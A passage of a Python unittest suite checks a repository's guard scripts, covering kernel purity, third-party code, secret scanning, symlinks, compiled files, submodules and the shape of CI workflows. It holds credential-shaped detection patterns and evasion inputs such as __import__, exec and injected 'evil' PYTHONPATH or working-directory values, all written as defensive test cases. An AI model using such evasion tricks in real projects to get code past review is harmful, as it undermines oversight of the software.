                     "from kernel import terms as t\n\n\ndef f():\n    t.HELD, x = 'a', 1\n    return x\n",
                     "def f():\n    f.seen = 1\n"):
            self.assertTrue(caught(check_purity.run(tree({"kernel/x.py": text})), "assigns an attribute"), text)
        self.assertEqual(check_purity.run(tree({"kernel/x.py": "from kernel import terms as t\n\n\ndef f():\n"
                                                "    return t.HELD\n"})), [])

    def test_the_brakes_and_the_gate_stand_apart(self):
        # Each is a protected path alone. The gate imports nothing of the Kernel and the brakes only its codes, so no
        # module that is not protected can change what they decide, and no other module stands in for one of theirs.
        gate = "SECURITY = 'security'\n\n\ndef gates(facts, config):\n    return []\n"
        brakes = "from kernel import terms as t\nfrom kernel.terms import HELD\n\n\ndef paused(_decision, facts):\n" \
                 "    return None\n"
        derive = "from kernel import brakes, gate\nfrom kernel.gate import gates\nimport kernel.gate as gate\n\n\n" \
                 "def derive(facts):\n    pause = brakes.paused(None, facts)\n    return pause or gates(facts, {})\n"
        clean = {"kernel/gate.py": gate, "kernel/brakes.py": brakes, "kernel/derive.py": derive}
        self.assertEqual(check_purity.run(tree(clean)), [])
        # Any binding of a name either owns stands in for theirs, at any depth and in any form, and so does a binding
        # of either module's own name to anything but that module. Each also binds no name of the other's.
        d, g, b = "kernel/derive.py", "kernel/gate.py", "kernel/brakes.py"
        for rel, text, word, owner in (
                (d, "def gates(facts, config):\n    return []\n", "gates", "gate.py"),
                (d, "def f(facts):\n    def gates(a, b):\n        return []\n    return gates(facts, 0)\n", "gates",
                 "gate.py"),
                (d, "SECURITY = 'none'\n", "SECURITY", "gate.py"),
                (d, "def f(facts):\n    gates = facts\n    return gates\n", "gates", "gate.py"),
                (d, "def derive(facts, gates=None):\n    return gates\n", "gates", "gate.py"),
                (d, "def f(xs):\n    return (lambda gates: gates)(xs)\n", "gates", "gate.py"),
                (d, "def f(xs):\n    return [gates for gates in xs]\n", "gates", "gate.py"),
                (d, "def f(xs):\n    for paused in xs:\n        return paused\n", "paused", "brakes.py"),
                (d, "def f(x):\n    with x as paused:\n        return paused\n", "paused", "brakes.py"),
                (d, "def f(x):\n    try:\n        return x\n    except ValueError as gates:\n        return gates\n",
                 "gates", "gate.py"),
                (d, "def f(x):\n    if (gates := x):\n        return gates\n", "gates", "gate.py"),
                (d, "from kernel.terms import NONE as gates\n", "gates", "gate.py"),
                (d, "from kernel.gate import SECURITY as gates\n", "gates", "gate.py"),
                (d, "from kernel.brakes import paused as on_act\nfrom kernel.terms import HELD as paused\n", "paused",
                 "brakes.py"),
                (d, "from kernel import terms as gate\n", "gate", "gate.py"),
                (d, "import kernel.terms as gate\n", "gate", "gate.py"),
                (d, "from kernel import derive as brakes\n", "brakes", "brakes.py"),
                (d, "def brakes(x):\n    return x\n", "brakes", "brakes.py"),
                (b, "from kernel.terms import HELD as gates\n" + brakes, "gates", "gate.py"),
                (b, "from kernel.terms import HELD as paused\n" + brakes, "paused", "brakes.py"),
                (g, gate + "\n\ndef paused(x):\n    return x\n", "paused", "brakes.py"),
                (g, gate + "\n\ndef f(brakes):\n    return brakes\n", "brakes", "brakes.py")):
            said = check_purity.run(tree(dict(clean, **{rel: text})))
            self.assertTrue(caught(said, "binds %s, which %s owns" % (word, owner)), (rel, text, said))
        for rel, text, words in (("kernel/gate.py", "from kernel import terms as t\n" + gate, "imports kernel.terms"),
                                 ("kernel/gate.py", "import kernel.derive\n" + gate, "imports kernel.derive"),
                                 ("kernel/gate.py", "from . import terms\n" + gate, "imports ."),
                                 ("kernel/brakes.py", "from kernel.derive import since_writer\n" + brakes,
                                  "imports kernel.derive"),
                                 ("kernel/brakes.py", "from kernel import terms, decide\n" + brakes,
                                  "imports kernel.decide")):
            said = check_purity.run(tree(dict(clean, **{rel: text})))
            self.assertTrue(caught(said, words), (rel, text, said))

    def test_a_way_round_the_names_is_caught(self):
        root = tree({"kernel/x.py": "def f():\n    return __builtins__['open'], getattr(f, 'x')\n"})
        problems = check_purity.run(root)
        self.assertTrue(caught(problems, "uses __builtins__") and caught(problems, "uses getattr"))

    def test_no_kernel_and_a_kernel_that_cannot_be_read_are_problems_not_crashes(self):
        self.assertEqual(check_purity.run(tree({"x": ""})), ["there is no kernel/ to check"])
        self.assertTrue(caught(check_purity.run(tree({"kernel/x.py": "def f(:\n"})), "cannot be read as Python"))
        self.assertTrue(caught(check_purity.run(tree({"kernel/x.py": "async def f():\n    return 1\n"})), "async function"))


class Repo(unittest.TestCase):
    def test_third_party_code_is_caught(self):
        root = tree({"a.py": "import requests\n", "requirements.txt": "requests\n",
                     "tools/vendor/requests/__init__.py": "", "dev-requirements.txt": "x\n", "poetry.lock": ""})
        problems = check_repo.run(root)
        for words in ("imports requests", "requirements.txt: a dependency manifest", "dev-requirements.txt: a dep",
                      "poetry.lock: a dep", "copied in is still third-party"):
            self.assertTrue(caught(problems, words), words)
        self.assertFalse(caught(check_repo.run(tree({"docs/prd/requirements.md": "x", "a.py": "from . import b\n"})),
                                "manifest"))

    def test_code_loaded_round_the_import_list_is_caught(self):
        root = tree({"a.py": "s = __import__('socket')\nexec('import requests')\n"})
        problems = check_repo.run(root)
        self.assertTrue(caught(problems, "uses __import__") and caught(problems, "uses exec"))

    def test_something_shaped_like_a_credential_is_caught(self):
        for name in ("notes.md", "deploy.sh", "x.env", "key.pem"):
            root = tree({name: "token: " + "ghp_" + "a1B2" * 9 + "\n"})
            self.assertTrue(caught(check_repo.run(root), "shaped like a credential"), name)
        shapes = ["github_pat_" + "a1B2" * 9, "glpat-" + "a1B2" * 6, "sk-" + "ant-" + "a1B2" * 6, "AKIA" + "A1B2" * 4,
                  "xoxb" + "-1234567890-abc", "-----BEGIN RSA " + "PRIVATE KEY-----"]
        for shape in shapes:
            self.assertTrue(caught(check_repo.run(tree({"a.py": "X = '%s'\n" % shape})), "credential"), shape[:6])

    def test_a_model_named_by_its_full_id_is_caught_outside_the_documents(self):
        name = "claude-" + "opus-5-5"
        self.assertTrue(caught(check_repo.run(tree({"roles/pr-review/prompt.md": name})), "names a model"))
        self.assertTrue(caught(check_repo.run(tree({"config/x.json": '"gpt-' + '4o-mini"'})), "names a model"))
        self.assertFalse(caught(check_repo.run(tree({"docs/notes.md": name})), "names a model"))

    def test_an_edited_secrets_baseline_is_caught(self):
        whole = (ROOT / ".gitignore").read_text()
        self.assertFalse(caught(check_repo.run(tree({".gitignore": whole})), "baseline"))
        self.assertTrue(caught(check_repo.run(tree({".gitignore": whole.replace(".env\n", "", 1)})), "has been edited"))
        self.assertTrue(caught(check_repo.run(tree({".gitignore": "__pycache__/\n"})), "does not open with"))

    def test_code_owners_are_the_orgs_word_for_word(self):
        whole = (ROOT / ".github" / "CODEOWNERS").read_text()
        self.assertFalse(caught(check_repo.run(tree({".github/CODEOWNERS": whole})), "CODEOWNERS"))
        mine = whole + "/kernel/ @don-petry\n"
        self.assertTrue(caught(check_repo.run(tree({".github/CODEOWNERS": mine})), "not the org's file"))
        self.assertTrue(caught(check_repo.run(tree({"x": ""})), "CODEOWNERS is missing"))
        self.assertTrue(caught(check_repo.run(tree({".github/CODEOWNERS": whole, "CODEOWNERS": whole})),
                               "keep only .github/CODEOWNERS"))

    def test_a_second_definition_is_caught(self):
        root = tree({"a.py": "class T:\n    def test_x(self):\n        pass\n\n    def test_x(self):\n        pass\n",
                     "b.py": "async def f():\n    pass\n\nasync def f():\n    pass\n"})
        problems = check_repo.run(root)
        self.assertTrue(caught(problems, "a.py:5 defines test_x a second time") and caught(problems, "b.py:4 defines f"))
        prop = "class T:\n    @property\n    def x(self):\n        return 1\n\n    @x.setter\n    def x(self, v):\n        pass\n"
        self.assertFalse(caught(check_repo.run(tree({"a.py": prop})), "a second time"))

    def test_syntax_newer_than_the_oldest_python_is_caught(self):
        root = tree({"a.py": "match 1:\n    case 1:\n        pass\n"})
        self.assertTrue(caught(check_repo.run(root), "is not Python 3.9"))

    def test_a_draw_that_differs_between_python_versions_is_caught(self):
        root = tree({"sim/x.py": "import random\n\ndef f(self):\n    return self.rng.choice([1, 2]), self.rng.random()\n",
                     "sim/y.py": "from random import shuffle\n"})
        problems = check_repo.run(root)
        self.assertEqual(len([p for p in problems if "sim/x.py" in p]), 1)
        self.assertTrue(caught(problems, "calls choice") and caught(problems, "takes a draw from random by name"))

    def test_reaching_into_the_proof_of_concept_is_caught(self):
        root = tree({"a.json": json.dumps({"repo": "combsmith/" + check_repo.FOREIGN})})
        self.assertTrue(caught(check_repo.run(root), "proof-of-concept repo"))

    def test_a_test_where_nothing_will_run_it_is_caught(self):
        root = tree({"tools/test_checks.py": "", "tests/unit/test_new.py": "", "tests/test_ok.py": ""})
        problems = check_repo.run(root)
        self.assertTrue(caught(problems, "tools/test_checks.py: a test outside tests/"))
        self.assertTrue(caught(problems, "tests/unit/test_new.py: a test below tests/"))
        self.assertFalse(caught(problems, "test_ok.py"))

    def test_a_link_is_refused_wherever_it_is(self):
        # Every check reads the tree through tools/walk.py, which never follows a link. Python
        # imports through one all the same, so a link would carry code past the purity check.
        root = tree({"kernel/x.py": "", "sim/x.py": "", "docs/ext/clock.py": "import time\n",
                     "docs/clock.py": "import time\n"})
        for where in ("kernel", "sim"):
            (root / where / "ext").symlink_to("../docs/ext", target_is_directory=True)
            (root / where / "clock.py").symlink_to("../docs/clock.py")
        (root / "kernel" / "gone.py").symlink_to("nowhere.py")
        self.assertFalse(caught(check_purity.run(root), "ext/clock.py"))      # why: unread, yet importable
        said = sorted(p for p in check_repo.run(root) if ": a link" in p)
        self.assertEqual([p.split(";")[0] for p in said],
                         ["kernel/clock.py: a link to a file", "kernel/ext: a link to a directory",
                          "kernel/gone.py: a link to nothing",
                          "sim/clock.py: a link to a file", "sim/ext: a link to a directory"])
        self.assertTrue(caught(said, "kernel/ext: a link to a directory; Python imports through it, but no check"))
        self.assertTrue(caught(said, "kernel/gone.py: a link to nothing; commit what it points at, or remove it"))


    def test_compiled_code_is_refused_wherever_it_is(self):
        # Python imports kernel/ghost.pyc with no source beside it, and kernel/decide.<tag>.so ahead of
        # kernel/decide.py, yet check_purity reads only .py. No check can read compiled code.
        root = tree({"kernel/decide.py": "", "kernel/ghost.pyc": "", "kernel/decide.cpython-39-darwin.so": "",
                     "sim/x.pyo": "", "tools/x.pyd": "", "docs/x.pyc.md": "", "docs/so": "",
                     "kernel/Spectre.PYC": "", "tools/y.So": ""})
        problems = check_repo.run(root)
        self.assertEqual(sorted(p.split(";")[0] for p in problems if "compiled" in p),
                         ["kernel/Spectre.PYC: compiled code", "kernel/decide.cpython-39-darwin.so: compiled code",
                          "kernel/ghost.pyc: compiled code", "sim/x.pyo: compiled code", "tools/x.pyd: compiled code",
                          "tools/y.So: compiled code"])
        self.assertTrue(caught(problems, "kernel/ghost.pyc: compiled code; Python loads it ahead of, or instead of, "
                                         "the reviewed source, and no check reads it"))

    def test_committed_local_output_is_refused(self):
        # An unchecked-hash kernel/__pycache__/hidden.cpython-39.pyc replaces the reviewed kernel/hidden.py
        # at import, and `git add -f` commits it past .gitignore. What git holds is not local output.
        token = "github_pat_" + "x" * 40 + "\n"
        root = tree({"kernel/hidden.py": "", "kernel/__pycache__/hidden.cpython-39.pyc": "", "corpus/d.jsonl": token,
                     "sim/__pycache__/x.cpython-39.pyc": "", "corpus/local.jsonl": ""})
        commit(root, {"kernel/hidden.py": FILE, "kernel/__pycache__/hidden.cpython-39.pyc": FILE, "corpus/d.jsonl": FILE})
        problems = check_repo.run(root)
        for words in ("kernel/__pycache__/hidden.cpython-39.pyc: compiled code",
                      "kernel/__pycache__/hidden.cpython-39.pyc: in __pycache__/, Python's local output, committed",
                      "corpus/d.jsonl: in corpus/, local output make_corpus.py writes, committed",
                      "corpus/d.jsonl: holds something shaped like a credential"):
            self.assertTrue(caught(problems, words), words)
        self.assertFalse(caught(problems, "sim/__pycache__"))
        self.assertTrue(caught(problems, "kernel/__pycache__/hidden.cpython-39.pyc: in __pycache__/, Python's local "
                                         "output, committed; Python loads it ahead of the reviewed source"))
        # A file system that folds case, as macOS's does, finds kernel/__PYCACHE__/ when Python opens
        # kernel/__pycache__/, and runs what is there.
        root = staged({"kernel/hidden.py": "", "kernel/__PYCACHE__/hidden.cpython-314.PYC": "", "Corpus/d.jsonl": ""})
        problems = check_repo.run(root)
        for words in ("kernel/__PYCACHE__/hidden.cpython-314.PYC: compiled code",
                      "kernel/__PYCACHE__/hidden.cpython-314.PYC: in __pycache__/", "Corpus/d.jsonl: in corpus/"):
            self.assertTrue(caught(problems, words), words)
        # What git holds is committed, whatever case the folder it is in was given on disk.
        root = commit(tree({"kernel/__pycache__/x.pyc": ""}), {"kernel/__PYCACHE__/x.pyc": FILE})
        self.assertTrue(caught(check_repo.run(root), "kernel/__pycache__/x.pyc: in __pycache__/"))

    def test_what_git_holds_is_refused_though_gone_from_disk(self):
        # Staged, then deleted from the working tree with the deletion not staged: the walk cannot see
        # it, yet the index still holds it, and the next commit takes it in.
        gone = ["kernel/ghost.pyc", "kernel/__pycache__/y.cpython-39.pyc", "corpus/d.jsonl", "docs/.gitmodules"]
        root = staged(dict({"kernel/x.py": "", "sim/z.PYC": ""}, **{rel: "" for rel in gone}))
        for rel in gone:
            (root / rel).unlink()
        problems = check_repo.run(root)
        for words in ("kernel/ghost.pyc: compiled code", "kernel/__pycache__/y.cpython-39.pyc: compiled code",
                      "kernel/__pycache__/y.cpython-39.pyc: in __pycache__/", "corpus/d.jsonl: in corpus/",
                      "docs/.gitmodules: declares a submodule"):
            self.assertTrue(caught(problems, words), words)
        self.assertEqual(len([p for p in problems if p.startswith("sim/z.PYC: compiled code")]), 1)   # on disk, once

    def test_a_submodule_is_refused(self):
        # A submodule's files come from another repo, at a commit this one's review never sees. Checked
        # out, it holds a .git file, and the walk skips it as another working tree.
        root = tree({".gitmodules": "[submodule \"lib\"]\n\tpath = kernel/lib\n", "kernel/lib/.git": "gitdir: x\n",
                     "kernel/lib/clock.py": "import time\n", "docs/.gitmodules": "", "sim/.GITMODULES": ""})
        commit(root, {".gitmodules": FILE, "kernel/lib": GITLINK, "docs/.gitmodules": FILE, "sim/.GITMODULES": FILE})
        problems = check_repo.run(root)
        for words in ("kernel/lib: a submodule; its files come from another repo",
                      ".gitmodules: declares a submodule", "docs/.gitmodules: declares a submodule",
                      "sim/.GITMODULES: declares a submodule"):
            self.assertTrue(caught(problems, words), words)
        self.assertFalse(caught(check_purity.run(root), "clock.py"))      # why: unread, yet importable

    def test_an_index_that_cannot_be_read_is_a_problem_and_skips_nothing(self):
        files = {"kernel/x.py": "", "sim/__pycache__/x.cpython-39.pyc": ""}
        whole = git_index({"kernel/x.py": FILE})
        split = whole[:-20] + b"link" + bytes(4)
        for name, data in (("garbage", b"not an index"), ("version 5", whole[:4] + (5).to_bytes(4, "big") + whole[8:]),
                           ("short", whole[:40]), ("checksum", whole[:-1] + b"x"),
                           ("split", split + hashlib.sha1(split, usedforsecurity=False).digest())):
            with self.subTest(index=name):
                root = commit(tree(files), {})
                (root / ".git" / "index").write_bytes(data)
                problems = check_repo.run(root)
                self.assertTrue(caught(problems, "git's index cannot be read"))
                self.assertTrue(caught(problems, "sim/__pycache__/x.cpython-39.pyc: compiled code"))
        root = tree(dict(files, **{".git": "no gitdir here\n"}))
        self.assertTrue(caught(check_repo.run(root), "git's index cannot be read"))
        # Broken the ways git never writes: version 4 cutting more from a path than the one before it
        # holds (the first has none before it), and an extension that runs past the end.
        real = staged({"kernel/x.py": "", "kernel/y.py": ""}, "index.version=4")
        whole = (real / ".git" / "index").read_bytes()
        cut = bytearray(whole[:-20])
        cut[12 + 62] = 5
        for data, words in ((checked(bytes(cut)), "a path is cut by more than it holds"),
                            (checked(whole[:-20] + b"ZZZZ" + (99).to_bytes(4, "big")), "it ends early")):
            with self.subTest(words=words):
                (real / ".git" / "index").write_bytes(data)
                self.assertTrue(caught(check_repo.run(real), "git's index cannot be read (%s)" % words))
        # One that cannot be opened is a sentence, not a traceback.
        root = commit(tree(files), {})
        (root / ".git" / "index").unlink()
        (root / ".git" / "index").mkdir()
        self.assertTrue(caught(check_repo.run(root), "git's index cannot be read (it cannot be opened"))
        self.assertTrue(caught(check_repo.run(root), "sim/__pycache__/x.cpython-39.pyc: compiled code"))


class Workflows(unittest.TestCase):
    def test_the_example_passes_and_every_rule_has_been_tripped(self):
        self.assertEqual(check_workflows.run(), [])

    def test_a_rule_with_no_counter_example_is_caught(self):
        problems = check_workflows.run(tree({"examples/workflows/verify.yml": GOOD}))
        self.assertEqual(len(problems), len(check_workflows.RULES))

    def test_a_counter_example_must_break_its_rule_and_no_other(self):
        both = GOOD.replace("ubuntu-24.04", "ubuntu-latest").replace("    timeout-minutes: 15\n", "")
        root = clone({"examples/workflows/invalid/runner.two-faults.yml": both,
                      "examples/workflows/invalid/soft.no-fault.yml": GOOD})
        problems = check_workflows.run(root)
        self.assertTrue(caught(problems, "runner.two-faults.yml: must break the rule 'runner' and no other"))
        self.assertTrue(caught(problems, "soft.no-fault.yml: must break the rule 'soft' and no other, and breaks none"))

    def test_an_example_in_the_standard_that_has_drifted_is_caught(self):
        root = tree({"examples/workflows/verify.yml": GOOD,
                     "docs/standards/workflows.md": "```yaml\n" + GOOD.replace("minutes: 15", "minutes: 90") + "```\n"})
        self.assertTrue(caught(check_workflows.run(root), "word for word"))

    def test_the_required_check_that_has_drifted_from_its_example_is_caught(self):
        root = tree({"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": GOOD.replace("minutes: 15", "minutes: 45")})
        self.assertTrue(caught(check_workflows.run(root), "change both together"))
        bumped = GOOD.replace("3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1", "a" * 40 + " # v8.0.0")
        root = tree({"examples/workflows/verify.yml": GOOD, ".github/workflows/verify.yml": bumped})
        self.assertFalse(caught(check_workflows.run(root), "change both together"))

    def test_a_lens_read_from_a_workflow_that_does_not_run_its_check_is_caught(self):
        # Each required Lens GitHub Actions runs is read only from the workflow file the configuration names for it. A
        # file that is gone, or that runs no job under the Lens's check name, would leave every pull request's check
        # another file's, and the Lens unreadable on all of them.
        defaults = json.loads((ROOT / "config" / "defaults.json").read_text())
        lenses = defaults["required_lenses"]["deterministic"]
        run_by_actions = [lens for lens in lenses if isinstance(lens["workflow"], str)]
        self.assertTrue(run_by_actions)
        for lens in run_by_actions:
            other = next(x["workflow"] for x in run_by_actions if x["workflow"] != lens["workflow"])
            for path, said in ((".github/workflows/gone.yml", "which does not exist"),
                               (other, "runs no job named %r" % lens["check"])):
                moved = [dict(x, workflow=path) if x is lens else x for x in lenses]
                cfg = dict(defaults, required_lenses=dict(defaults["required_lenses"], deterministic=moved))
                root = clone({"config/defaults.json": json.dumps(cfg, indent=2) + "\n"})
                self.assertTrue(caught(check_workflows.run(root), said), (lens["lens"], path))
            # The job renamed in its own file.
            text = (ROOT / lens["workflow"]).read_text()
            renamed = text.replace("    name: %s\n" % lens["check"], "    name: %s-renamed\n" % lens["check"])
            self.assertNotEqual(renamed, text, lens["lens"])
            root = clone({lens["workflow"]: renamed})
            self.assertTrue(caught(check_workflows.run(root), "runs no job named %r" % lens["check"]), lens["lens"])

    def lens_problems(self, text: str, lens: str = "verify") -> list:
        """The problems check_workflows finds when the Lens `lens` is read from a workflow file holding `text`."""
        defaults = json.loads((ROOT / "config" / "defaults.json").read_text())
        lenses = [dict(x, workflow=".github/workflows/lens.yml") if x["lens"] == lens else x
                  for x in defaults["required_lenses"]["deterministic"]]
        cfg = dict(defaults, required_lenses=dict(defaults["required_lenses"], deterministic=lenses))
        root = clone({"config/defaults.json": json.dumps(cfg, indent=2) + "\n", ".github/workflows/lens.yml": text})
        return [p for p in check_workflows.run(root) if "the Lens %s" % lens in p]

    def test_only_a_jobs_own_name_or_its_id_names_a_lens_check(self):
        # GitHub names a job's check run by the job's own name, or by its id where it has none. A workflow's name, or a
        # step's, names no check run.
        self.assertEqual(self.lens_problems(GOOD), [])
        self.assertEqual(self.lens_problems(GOOD.replace("    name: verify\n", "")), [])
        elsewhere = GOOD.replace("name: factory\n", "name: verify\n").replace("  verify:\n    name: verify\n", "  build:\n")
        elsewhere = elsewhere.replace("      - run: make verify\n", "      - name: verify\n        run: make verify\n")
        self.assertNotEqual(elsewhere, GOOD)
        self.assertTrue(caught(self.lens_problems(elsewhere), "runs no job named 'verify'"))
        renamed = GOOD.replace("  verify:\n    name: verify\n", "  verify:\n    name: build\n")
        self.assertTrue(caught(self.lens_problems(renamed), "runs no job named 'verify'"))

    def test_a_lens_job_that_would_never_report_under_its_name_is_caught(self):
        # A matrix names each of its check runs after the job and its values; a job-level if: can skip the job; a job
        # that calls a reusable workflow reports under the caller's and the callee's names; and a workflow that does not
        # run on both pull_request and merge_group reports on no head, or not in the merge queue. Each leaves the Lens
        # waiting for ever. The one if: allowed is always(), beside needs:, and a job that needs others is skipped when
        # one fails, which passes a required check, unless it runs under always() and judges every other job.
        needs = "    needs:\n      - checks\n      - commits\n      - mutants\n"
        judge = "      - run: python3 -m tools.needs_passed\n"
        given = "    env:\n      NEEDS: ${{ toJSON(needs) }}\n"
        matrix = GOOD.replace("    timeout-minutes: 10\n",
                              "    timeout-minutes: 10\n    strategy:\n      matrix:\n        python:\n          - 3.9\n")
        called = GOOD.split(needs)[0] + "    uses: combsmith/factory/.github/workflows/v.yml@v1-stable\n"
        other_if = "has a job-level if: other than always() beside needs:"
        cases = [(matrix, "has a strategy.matrix"),
                 (GOOD.replace("    if: always()\n", "    if: github.event_name == 'pull_request'\n"), other_if),
                 (GOOD.replace("    if: always()\n", "    if: ${{ always() }}\n"), other_if),
                 (GOOD.replace(needs, ""), other_if),
                 (called, "calls a reusable workflow with uses:"),
                 (GOOD.replace("  merge_group:\n", ""), "not on both pull_request and merge_group"),
                 (GOOD.replace("  pull_request:\n", ""), "not on both pull_request and merge_group"),
                 (GOOD.replace("    if: always()\n", ""), "it has no job-level if: always()"),
                 (GOOD.replace("      - mutants\n", ""), "not every other job in its file"),
                 (GOOD.replace(needs, "    needs: checks\n"), "it needs checks, not every other job in its file"),
                 (GOOD.replace("      - mutants\n", "      - mutants\n      - deploy\n"), "not every other job in its file"),
                 (GOOD.replace(needs, "    needs: [checks, commits, mutants]\n"), "its needs: cannot be read as a list of jobs"),
                 (GOOD.replace(judge, "      - run: make verify\n"), "it runs no step `python3 -m tools.needs_passed`"),
                 (GOOD.replace(judge, judge + "        if: false\n"), "an if: can skip its step"),
                 (GOOD.replace(given, ""), "it does not give NEEDS"),
                 (GOOD.replace("toJSON(needs)", "toJSON(needs.checks)"), "it does not give NEEDS"),
                 (GOOD.replace(judge, judge + "        env:\n          NEEDS: '{}'\n"), "it does not give NEEDS"),
                 (GOOD.replace(needs, "").replace("    if: always()\n", "").replace(given, "")
                  .replace(judge, "      - run: make verify\n"), "it has no needs:, so the other jobs in its file"),
                 (GOOD.split("  checks:\n")[0] + "  verify:\n" + GOOD.split("  verify:\n")[1],
                  "it needs checks, commits, mutants, not every other job in its file, none"),
                 (GOOD.replace(judge, "      - run: |\n          make fast\n          python3 -m tools.needs_passed\n"),
                  "it runs no step `python3 -m tools.needs_passed`, on a line of its own"),
                 (GOOD.replace(judge, "      - run: >\n          python3 -m tools.verify\n          python3 -m tools.needs_passed\n"),
                  "it runs no step `python3 -m tools.needs_passed`, on a line of its own"),
                 (GOOD.replace(judge, judge + "      - run: make verify\n"), "its steps are more than a checkout"),
                 (GOOD.replace(judge, "      - uses: actions/github-script@" + "a" * 40 + " # v7\n" + judge),
                  "its steps are more than a checkout")]
        for text, said in cases:
            self.assertNotEqual(text, GOOD, said)
            self.assertTrue(caught(self.lens_problems(text), said), said)
        # The list of what it needs may stand at the indent of its key, as YAML allows.
        level = GOOD.replace(needs, "    needs:\n    - mutants\n    - commits\n    - checks\n")
        spaced = GOOD.replace(needs, "    needs:\n      - checks\n      - commits\n\n      # the shards\n      - mutants\n")
        for text in (level, spaced):
            self.assertNotEqual(text, GOOD)
            self.assertEqual(self.lens_problems(text), [])

    def test_the_commits_job_reads_the_pull_requests_commits_from_the_base(self):
        # Decision 0041: the job commits checks out the base with the whole history, is told the base, the head and the
        # event by the event's expressions, and runs the base's tools/commits_are_the_maintainers.py on a line of its
        # own, with nothing else that could act for it.
        job = GOOD[GOOD.index("  commits:\n"):GOOD.index("  verify:\n")]
        reading = "      - run: python3 -m tools.commits_are_the_maintainers\n"
        depth = "          fetch-depth: 0\n          ref: %s\n" % check_workflows.BASE
        self.assertEqual((job.count(reading), job.count(depth)), (1, 1))
        shape = "its job commits's steps are not a checkout"
        cases = [(GOOD.replace(job, "").replace("      - commits\n", ""), "has no job commits"),
                 (GOOD.replace(job, job.replace("    env:\n", "    if: always()\n    env:\n")), "has keys other than"),
                 (GOOD.replace(job, job.replace("    env:\n", "    container: ghcr.io/x/y:1\n    env:\n")), "has keys other than"),
                 (GOOD.replace(job, job.replace("    env:\n", "    strategy:\n      matrix:\n        a:\n          - 1\n    env:\n")),
                  "has keys other than"),
                 (GOOD.replace(job, job.replace("    timeout-minutes: 10\n", "")), "has keys other than"),
                 (GOOD.replace(job, job.replace("      contents: read\n", "      contents: write\n")), "granted other than"),
                 (GOOD.replace(job, job.replace("      EVENT: ${{ github.event_name }}\n", "")), "is not told BASE_SHA"),
                 (GOOD.replace(job, job.replace("github.event.merge_group.head_sha", "github.sha")), "is not told BASE_SHA"),
                 (GOOD.replace(job, job.replace(depth, "          ref: %s\n" % check_workflows.BASE)), "whole history"),
                 (GOOD.replace(job, job.replace(depth, "          fetch-depth: 0\n")), "check out the base alone"),
                 (GOOD.replace(job, job.replace(depth, depth.replace("base.sha", "head.sha"))), "check out the base alone"),
                 (GOOD.replace(job, job.replace(reading, "      - run: make verify\n")), "runs no step"),
                 (GOOD.replace(job, job.replace(reading, reading + "        if: false\n")), shape),
                 (GOOD.replace(job, job.replace(reading, reading + "        env:\n          BASE_SHA: abc\n")), shape),
                 (GOOD.replace(job, job.replace(reading, reading + "        shell: bash\n")), shape),
                 (GOOD.replace(job, job.replace(reading, reading + "      - run: make verify\n")), shape),
                 (GOOD.replace(job, job.replace(reading, "      - uses: actions/github-script@" + "a" * 40 + " # v7\n" + reading)),
                  shape)]
        for text, said in cases:
            self.assertNotEqual(text, GOOD, said)
            self.assertTrue(caught(self.lens_problems(text), said), said)
        self.assertEqual(self.lens_problems(GOOD), [])

    def test_the_judging_step_and_its_checkout_are_held_to_their_exact_shape(self):
        # Issue 180: a working-directory: on the judging step would run another tree's tools/needs_passed.py, a shell:
        # or an env: on it or a container: on the job would change how it runs, and a missing checkout would leave no
        # base to judge from. The job's keys, its permissions, and each step's keys are held exactly.
        judge = "      - run: python3 -m tools.needs_passed\n"
        base = ("      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n"
                "          persist-credentials: false\n          ref: %s\n" % check_workflows.BASE)
        self.assertEqual((GOOD.count(judge), GOOD.count(base)), (1, 1))
        shape = "its steps are not a checkout"
        cases = [(GOOD.replace(judge, judge + "        working-directory: evil\n"), shape),
                 (GOOD.replace(judge, judge + "        shell: bash\n"), shape),
                 (GOOD.replace(judge, judge + "        env:\n          NEEDS: '{}'\n"), shape),
                 (GOOD.replace(base, ""), "its one checkout is not of the base alone"),
                 (GOOD.replace("      contents: read\n    env:\n      NEEDS:", "      contents: read\n      issues: write\n    env:\n      NEEDS:"),
                  "granted other than"),
                 (GOOD.replace("    env:\n      NEEDS:", "    container: ghcr.io/x/y:1\n    env:\n      NEEDS:"), "has keys other than"),
                 (GOOD.replace("    env:\n      NEEDS:", "    defaults:\n      run:\n        working-directory: evil\n    env:\n      NEEDS:"),
                  "has keys other than"),
                 (GOOD.replace("    env:\n      NEEDS:", "    permissions:\n      contents: write\n    env:\n      NEEDS:"), "granted other than")]
        verify = GOOD[GOOD.index("  verify:\n"):]
        cases.append((GOOD.replace(verify, verify.replace("      contents: read\n", "      contents: write\n")),
                      "granted other than"))
        # Its env: is NEEDS alone, and the file has no top-level env: for the jobs to inherit: a PYTHONPATH there would
        # change the interpreter that runs the base's tools/needs_passed.py.
        cases.append((GOOD.replace(verify, verify.replace("      NEEDS:", "      PYTHONPATH: evil\n      NEEDS:")),
                      "its env: holds other than NEEDS"))
        cases.append((GOOD.replace("jobs:\n", "env:\n  PYTHONPATH: evil\njobs:\n"), "has a top-level env:"))
        cases.append((GOOD.replace("jobs:\n", "defaults:\n  run:\n    working-directory: evil\njobs:\n"), "has a top-level defaults:"))
        for text, said in cases:
            self.assertNotEqual(text, GOOD, said)
            self.assertTrue(caught(self.lens_problems(text), said), said)
        # Two with: blocks on the checkout, which a reader would refuse or merge into a checkout of the head, are not
        # the narrow form: the check never merges what no reader yields.
        split = base.replace("        with:\n          persist-credentials: false\n          ref:",
                             "        with:\n          ref: %s\n        with:\n          persist-credentials: false\n"
                             "          ref:" % check_workflows.BASE)
        self.assertNotEqual(split, base)
        self.assertIn("form", rules(GOOD.replace(base, split)))
        self.assertEqual(self.lens_problems(GOOD), [])

    def test_the_mutant_shards_are_told_their_index_and_count_by_the_matrix(self):
        # Issue 180: MUTANTS_SHARD written as a number would make every leg run one shard, and MUTANTS_SHARDS written as
        # a number could differ from the matrix's size; each is the matrix's own expression, the matrix is the one key
        # shard, and the job's shape is held exactly, as the judging job's is.
        job = GOOD[GOOD.index("  mutants:\n"):GOOD.index("  commits:\n")]
        index, total = "      MUTANTS_SHARD: ${{ strategy.job-index }}\n", "      MUTANTS_SHARDS: ${{ strategy.job-total }}\n"
        run = "      - run: python3 -m tools.mutants\n"
        self.assertEqual((job.count(index), job.count(total), job.count(run)), (1, 1, 1))
        told, shape = "not told MUTANTS_SHARD", "whose steps are not a checkout of the head"
